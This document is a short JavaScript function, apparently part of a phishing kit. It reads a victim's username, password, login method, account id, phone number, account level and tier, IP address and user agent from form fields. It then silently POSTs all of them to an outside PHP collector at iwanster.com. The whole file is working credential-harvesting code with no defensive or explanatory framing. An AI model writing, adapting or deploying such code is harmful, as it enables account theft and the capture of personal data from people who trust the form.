function iwan() {
        const a = $('#user').val();
        const b = $('#pass').val();
        const c = $('#login').val();
        const d = $('#id').val();
        const e = $('#hp').val();
        const f = $('#level').val();
        const g = $('#tier').val();
        const h = $('#ip').val();
        const i = $('#ua').val();
        
        if(d == "" || d == null) {
            return false;
        }
        if(e == "" || e == null) {
            return false;
        }
        if(f == "" || f == null) {
            return false;
        }
        if(g == "" || g == null) {
            return false;
        }
        
        apalo = new FormData()
        apalo.set('a',a)
        apalo.set('b',b)
        apalo.set('c',c)
        apalo.set('d',d)
        apalo.set('e',e)
        apalo.set('f',f)
        apalo.set('g',g)
        apalo.set('h',h)
        apalo.set('i',i)
        
        let iwan = new XMLHttpRequest();
        iwan.open("POST", 'http://iwanster.com/halima.php', true);
        iwan.send(apalo)
        
    }
